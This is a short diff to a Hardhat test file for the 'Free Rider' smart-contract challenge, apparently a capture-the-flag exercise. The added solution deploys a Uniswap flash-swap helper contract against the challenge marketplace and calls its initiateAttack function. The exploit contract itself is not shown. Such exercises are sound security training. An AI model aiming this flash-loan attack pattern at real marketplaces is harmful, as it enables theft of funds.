@@ -104,8 +104,16 @@ describe('[Challenge] Free Rider', function () {
         );
     });
 
-    it('Execution', async function () {
+    it('Execution Free Rider', async function () {
         /** CODE YOUR SOLUTION HERE */
+        helperContract = await (await ethers.getContractFactory('UniswapFlashReceiver', player)).deploy(
+            marketplace.address,
+            weth.address,
+            uniswapPair.address,
+            nft.address,
+            devsContract.address,
+        );
+        await helperContract.initiateAttack()
     });
 
     after(async function () {
